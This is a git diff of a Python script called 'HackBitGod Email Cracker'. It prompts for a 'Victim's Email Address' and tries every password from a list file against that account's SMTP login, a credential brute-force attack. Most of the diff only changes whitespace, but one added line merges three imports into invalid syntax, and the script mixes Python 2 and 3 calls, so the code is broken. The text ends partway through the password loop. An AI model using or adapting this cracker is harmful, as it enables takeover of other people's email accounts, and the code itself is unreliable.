@@ -7,13 +7,13 @@ class color:
 fa = color()
 
 logo = fa.YELLOW + fa.BOLD + r'''
-  _____ __  __    _    ___ _        ____ ____      _    ____ _  _______ ____  
- | ____|  \/  |  / \  |_ _| |      / ___|  _ \    / \  / ___| |/ / ____|  _ \ 
+  _____ __  __    _    ___ _        ____ ____      _    ____ _  _______ ____
+ | ____|  \/  |  / \  |_ _| |      / ___|  _ \    / \  / ___| |/ / ____|  _ \
  |  _| | |\/| | / _ \  | || |     | |   | |_) |  / _ \| |   | ' /|  _| | |_) |
- | |___| |  | |/ ___ \ | || |___  | |___|  _ <  / ___ \ |___| . \| |___|  _ < 
- |_____|_|  |_/_/   \_\___|_____|  \____|_| \_\/_/   \_\____|_|\_\_____|_| \_\ 
+ | |___| |  | |/ ___ \ | || |___  | |___|  _ <  / ___ \ |___| . \| |___|  _ <
+ |_____|_|  |_/_/   \_\___|_____|  \____|_| \_\/_/   \_\____|_|\_\_____|_| \_\
                                                                          v1.0
-Coded By : Hack-BitGod  
+Coded By : Hack-BitGod
 ''' + fa.END
 
 Prompt = fa.BOLD + "BitGod@Hack-BitGod:" + fa.END
@@ -21,10 +21,8 @@ Prompt = fa.BOLD + "BitGod@Hack-BitGod:" + fa.END
 print(logo)
 print(Prompt)
 
-import smtplib
-import time 
-import logging 
- 
+import smtplib import time import logging
+##
 class bcolors:
     OK = '\033[92m'
     FAIL = '\033[91m'
@@ -50,22 +48,22 @@ def connect_to_smtp_server():
 
 try:
     smtpserver = connect_to_smtp_server()
-    
+
     email_user = os.getenv('EMAIL_USER')
     email_pass = os.getenv('EMAIL_PASS')
-    
+
     smtpserver.login(email_user, email_pass)
     logging.info("Logged in successfully.")
-    
+
     from_addr = email_user
     to_addr = "recipient_email@gmail.com"
     subject = "Test Email"
     body = "This is a test email."
     msg = f"Subject: {subject}\n\n{body}"
-    
+
     smtpserver.sendmail(from_addr, to_addr, msg)
     logging.info("Email sent successfully.")
-    
+
     smtpserver.quit()
     logging.info("SMTP server connection closed.")
 except smtplib.SMTPAuthenticationError as auth_err:
@@ -74,14 +72,14 @@ except smtplib.SMTPException as smtp_err:
     logging.error(f"SMTP error occurred: {smtp_err}")
 except Exception as e:
     logging.error(f"An unexpected error occurred: {e}")
- 
+
 print (bcolors.BOLD + "HackBitGod Email Cracker" + bcolors.ENDC)
 print (bcolors.BOLD + "TRYING WITH PASSWORDS IN: psw.list" + bcolors.ENDC)
- 
+
 user = raw_input("Enter The Victim's Email Address: ")
 passwfile = "psw.list"
 passwfile = open(passwfile, "r")
- 
+
 for password in passwfile:
 	try:
 		smtpserver.login(user, password)
